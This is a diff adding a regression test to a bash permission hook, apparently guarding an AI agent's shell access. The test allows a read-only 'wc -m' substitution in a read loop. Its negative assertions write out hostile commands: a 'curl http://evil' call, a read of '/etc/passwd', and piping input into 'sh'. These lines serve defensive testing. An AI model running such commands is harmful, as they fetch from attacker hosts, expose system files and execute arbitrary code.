@@ -536,6 +536,38 @@ EOF
         assert not permission_hook.is_safe_bash('for f in *.txt; do cat "$f"; done')
         assert not permission_hook.is_safe_bash('for d in "x"; do printf \'%s\' "$d" | sh; done')
 
+    def test_2026_06_10_wc_m_charcount_read_loop(self):
+        '''Found: `cat <<'EOF' | while IFS= read -r line; do printf '%3d  %s\\n'
+        "$(printf '%s' "$line" | wc -m)" "$line"; done` hit Tier 3 4x in one day
+        with nondeterministic verdicts. It's the Unicode-aware (wc -m) sibling of
+        the already-safe `${#line}` form, but the blanket `$(` ban rejected it.
+        The read-only `$(printf '%s' "$line" | wc -m)` substitution is now allowed.'''
+        assert permission_hook.is_safe_bash(
+            'cat <<\'EOF\' | while IFS= read -r line; do '
+            'printf \'%3d  %s\\n\' "$(printf \'%s\' "$line" | wc -m)" "$line"; done\n'
+            'a draft line\nanother line\nEOF'
+        )
+        # The bare loop segment is also recognized
+        assert permission_hook._is_safe_read_loop(
+            'while IFS= read -r line; do '
+            'printf \'%3d  %s\\n\' "$(printf \'%s\' "$line" | wc -m)" "$line"; done'
+        )
+        # wc -c (bytes) and wc -w (words) are equally read-only
+        assert permission_hook._is_safe_read_loop(
+            'while read -r l; do printf \'%s\' "$(printf \'%s\' "$l" | wc -c)"; done'
+        )
+        # Any OTHER substitution stays rejected — the ban is only relaxed for wc
+        assert not permission_hook._is_safe_read_loop(
+            'while IFS= read -r line; do printf \'%s\' "$(curl http://evil)" "$line"; done'
+        )
+        assert not permission_hook._is_safe_read_loop(
+            'while IFS= read -r line; do printf \'%s\' "$(cat /etc/passwd)"; done'
+        )
+        # wc piped to something else is not the whitelisted shape
+        assert not permission_hook._is_safe_read_loop(
+            'while IFS= read -r line; do printf \'%s\' "$(printf \'%s\' "$line" | sh)"; done'
+        )
+
 
 # ============================================================================
 # Stop hook regressions
